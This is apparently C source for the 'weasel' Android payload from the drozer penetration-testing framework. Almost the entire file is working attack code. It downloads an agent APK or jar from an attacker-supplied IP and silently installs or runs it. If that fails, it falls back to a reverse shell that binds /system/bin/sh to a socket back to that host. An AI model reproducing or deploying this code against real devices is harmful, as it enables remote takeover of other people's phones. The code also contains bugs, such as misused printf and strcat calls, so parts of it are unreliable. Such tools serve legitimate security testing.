#include "utils.h"

/* Global variables. Yes, it is bad practice. No, I don't care :) */
char *ip;
char *port;
char *dir;


/* Install a drozer apk if we are [root], [system], [shell] or have the INSTALL_PACKAGES permission */
bool privileged_weasel()
{
    /* Check user id of weasel */
    int uid = geteuid();
    
    /* Determine whether we have privileged context */
    bool privileged = ((uid == 0) || (uid == 1000) || (uid == 2000));

    /* Speed optimisation to avoid this check if it is not necessary */
    if (!privileged)
        privileged = haveInstallPackages(uid);
    
    /* Download, install and start a full drozer if this weasel is privileged */
    if (privileged)
    {
        /* Pull down the apk file from HTTP server and place in current folder - retry every 5s upon failure */
        while (!downloadFile(ip, port, "agent.apk", dir))
            sleep(5);
        
        /* Install drozer */
        const char* pmString = "pm install %s/agent.apk > /dev/null 2>&1";
        char* pmCommand = malloc(strlen(pmString) - 2 + strlen(dir) + 1);
        sprintf(pmCommand, pmString, dir);
        system(pmCommand);
        
        /* Start drozer - maybe replace this with something that recreates `am` because some Android 2.1 devices have a very limited version of `am` */
        const char* amString = "am startservice -n com.mwr.droidhg.agent/.services.ClientService -e %s --ei port %d --ez ssl false -e ssl-truststore-path none -e ssl-truststore-password none -e password weasel > /dev/null 2>&1";
        char* amCommand = malloc(strlen(amString) - 4 + strlen(ip) + 5 + 1);
        sprintf(amCommand, amString, ip, port);
        system(amCommand);    
    }
    
    return drozerInstalled();
}

/* Attempt to inject a limited drozer agent into running process via app_process method */
bool sneaky_weasel()
{
    char* fileName = "agent";
    char* execClass = "com.mwr.drozer.ClientService";
    char* jarFilePath;
    char* odexFilePath;
    char* execPath;

    /* Pull down the jar file from HTTP server and place in current folder - retry every 5s upon failure */
    while (!downloadFile(ip, port, "agent.jar", dir))
            sleep(5);
    
    /* Formulate strings */
    jarFilePath = malloc(snprintf(NULL, 0, "%s/%s.jar", dir, fileName) + 1);
    odexFilePath = malloc(snprintf(NULL, 0, "%s/%s.odex", dir, fileName) + 1);
    sprintf(jarFilePath, "%s/%s.jar", dir, fileName);
    sprintf(odexFilePath, "%s/%s.odex", dir, fileName);
    debug("jarFilePath", jarFilePath);
    debug("odexFilePath", odexFilePath);
    
    /* Remove the current ODEX file if there is one */
    remove(odexFilePath);
    
    /* 
     * ODEX the jar file. This stops the OS from wanting to 
     * cache the dex file which we will certainly not have
     * permission to do. Normally writes the dex to 
     * /data/dalvik-cache/. This function relies heavily on
     * the BOOTCLASSPATH being set.
     */  
    if (odexAPKJAR(jarFilePath, odexFilePath))
        debug("odexAPKJAR", "success");
    else
    {
        debug("odexAPKJAR", "failure");
        return false;
    }
    
    /* Spawn new class using app_process and ip + port as parameters */
    setenv("CLASSPATH", jarFilePath, 1);
    execPath = malloc(snprintf(NULL, 0, "exec app_process %s %s %s %s", dir, execClass, ip, port) + 1);
    sprintf(execPath, "exec app_process %s %s %s %s", dir, execClass, ip, port);
    debug("system()", "Hold thumbs...we are attempting to run it...");
    system(execPath);
    
    return true;
}

/* If all the other techniques have failed, send a shell */
bool defeated_weasel()
{
    /* Create socket */
    int s = socket(AF_INET, SOCK_STREAM, 0);
 
    /* Populate details of server */
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(ip);
    server.sin_port = htons(atoi(port));

    /* Connect */
    if (connect(s, (struct sockaddr *) &server, sizeof(struct sockaddr)) != 0)
        return false;

    /* Send the magic header to let the server know that this is a plain shell connection */
    char *magic = "S";
    send(s, magic, strlen(magic), 0);
    
    /* Add current folder to PATH */
    char *path = getenv("PATH");
    strcat(path, ":");
    strcat(path, dir);
    setenv("PATH", path, 1);

    /* Connect stdin, stdout and stderr to socket */
    dup2(s, STDIN_FILENO);
    dup2(s, STDOUT_FILENO);
    dup2(s, STDERR_FILENO);

    /* Run shell */
    system("/system/bin/sh -i");

    return true;
}
 
/* usage: weasel <ip> <port>            */
/* usage: weasel <ip> <port> get <file> */

int main(int argc, char** argv)
{
    /* Get current directory */
    dir = malloc(snprintf(NULL, 0, "%s", getCurrentDirectory()) + 1);
    sprintf(dir, "%s", getCurrentDirectory());

    /* Check args */
    if (argc == 3)
    {
        debug("weasel", argv[1]);
        debug("weasel", argv[2]);

        /* Assign input to vars */
        ip = malloc(snprintf(NULL, 0, "%s", argv[1]) + 1);
        sprintf(ip, "%s", argv[1]);
        port = malloc(snprintf(NULL, 0, "%s", argv[2]) + 1);
        sprintf(port, "%s", argv[2]);
    }
    else if (argc == 5)
    {
        /* Download a file from HTTP server and place in current folder */
        /* e.g. Download busybox binary */
        debug("weasel", argv[4]);
        downloadFile(argv[1], argv[2], argv[4], dir);
        return 0;
    }
    else
    {
        printf("usage: weasel <ip> <port>\n");
        printf("usage: weasel <ip> <port> get <file>\n");
        __android_log_write(ANDROID_LOG_INFO, "weasel", "incorrect parameters");
        return 0;
    }

    /* Make sure that PATH is set */
    ensureEnvironmentalVarIsSet("PATH");

    /* Make sure that BOOTCLASSPATH is set */
    ensureEnvironmentalVarIsSet("BOOTCLASSPATH");

    /* Make sure that LD_LIBRARY_PATH is set */
    ensureEnvironmentalVarIsSet("LD_LIBRARY_PATH");
    
    /* Bring forth the weasel! */

    if (privileged_weasel())
    {
        debug("weasel", "[+] The privileged weasel commanded the install of a drozer agent");
        return 0;
    }
    else
        debug("weasel", "[-] Your weasel is not privileged");
    
    if (sneaky_weasel())
    {
        printf("weasel", "[+] Your sneaky weasel has slipped a drozer into your process");
        return 0;
    }
    else
        debug("weasel", "[-] Your weasel is not sneaky"); 

    while (!defeated_weasel())
    {
        debug("weasel", "[*] Weasel loves eggs but really hates shells! This was a last resort...");
        sleep(5);
    }

    return 0;  
}